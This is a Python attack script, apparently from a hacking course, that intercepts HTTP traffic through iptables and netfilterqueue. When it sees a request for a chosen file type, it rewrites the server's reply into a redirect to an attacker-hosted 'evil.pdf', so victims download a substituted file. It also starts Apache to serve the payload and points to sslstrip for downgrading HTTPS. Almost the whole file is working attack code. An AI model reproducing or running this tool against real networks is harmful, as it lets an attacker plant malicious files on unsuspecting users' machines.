#!/usr/bin/env python3

import argparse             # https://docs.python.org/3/library/argparse.html
import netfilterqueue       # https://github.com/oremanj/python-netfilterqueue
import os                   # https://docs.python.org/3/library/os.html
import scapy.all as scapy   # https://scapy.readthedocs.io/en/latest/index.html
import subprocess           # https://docs.python.org/3/library/subprocess.html
import sys                  # https://docs.python.org/3/library/sys.html
import textwrap             # https://docs.python.org/3/library/textwrap.html

ack_list = []


def is_not_root():
    return os.geteuid() != 0


def get_args():
    parser = argparse.ArgumentParser(
        description="File replacement tool (use Bettercap hstshijack/hstshijack for sslstripping)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """Example: 
            file_interceptor.py # replace a .pdf with an evil.pdf file in location apache2 server on kali, sslstrip
            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf            # replace a .pdf file
            file_interceptor.py -e .pdf -u 192.168.122.108/evil/evil.pdf -d local   # test replacing a .pdf file
        """
        ),
    )
    parser.add_argument("-e", "--extension", default=".pdf", help="File extension")
    parser.add_argument("-d", "--destination", default="sslstrip", help="sslstrip, forward, or local")
    parser.add_argument("-u", "--url", default="192.168.122.108/evil/evil.pdf", help="Replacement url")
    values = parser.parse_args()
    return values


def apache_start():
    print("[+] Starting apache2 service ...")
    try:
        subprocess.check_output(["service", "apache2", "start"])
    except subprocess.CalledProcessError:
        print("[+] Installing and starting apache2 service...")
        subprocess.call("apt-get install apache2 -y", shell=True)
        subprocess.call("service apache2 start", shell=True)
    print("[+] Done")


def run_queue(destination, qnum):
    if destination == "forward":
        subprocess.call(
            "iptables -I FORWARD -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    elif destination == "sslstrip":
        subprocess.call(
            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "sudo iptables -t nat -A PREROUTING -p tcp"
            " --destination-port 80 -j REDIRECT --to-port 8080",
            shell=True,
        )
    elif destination == "local":
        subprocess.call(
            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    else:
        print("[-] Unknown destination")

    # Create netfilterqueue instance
    queue = netfilterqueue.NetfilterQueue()
    # Bind queue number 0 (queue zero in iptables)
    queue.bind(qnum, process_packet)
    # Run the queue
    queue.run()


def restore():
    print("[+] Flushing iptables queue(s)")
    subprocess.call("iptables --flush", shell=True)
    print("[+] Stopping apache server")
    subprocess.call("service apache2 stop", shell=True)


def forge_packet(packet, load):
    packet[scapy.Raw].load = load
    # Packet corruption can be detected using the checksum and
    # len fields. By deleting these scapy generates new entries.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # Convert the NetfilterQueue packet into a scapy packet.
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())

    # HTTP data is placed in the Raw layer.
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show()
        # tcp dport = destination (request)
        if (
            scapy_packet[scapy.TCP].dport == 80
            or scapy_packet[scapy.TCP].dport == 8080
        ):
            print(str(scapy_packet[scapy.Raw].load))
            print(options.extension)
            # If target extension is in the load, wait for
            # the response to the package.
            if options.extension in str(
                scapy_packet[scapy.Raw].load
            ) and options.url not in str(scapy_packet[scapy.Raw].load):
                print("[+] {} request".format(options.extension))
                ack_list.append(scapy_packet[scapy.TCP].ack)

        # tcp sport = source (response)
        elif (
            scapy_packet[scapy.TCP].sport == 80
            or scapy_packet[scapy.TCP].sport == 8080
        ):
            # If it is a response we have been waiting for
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing Files")
                forged_packet = forge_packet(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(
                        options.url
                    ),
                )
                # Set the forged scapy packet payload to the
                # NetfilterQueue packet.
                packet.set_payload(bytes(forged_packet))

    # Forward to the victim.
    packet.accept()


if __name__ == "__main__":
    # Check whether we're root
    if is_not_root():
        sys.exit("[-] This script requires superuser privileges")
    options = get_args()
    try:
        apache_start()
        run_queue(options.destination, 3)
    except KeyboardInterrupt:
        print("[+] \nDetected CTRL+C ... ")
        restore()
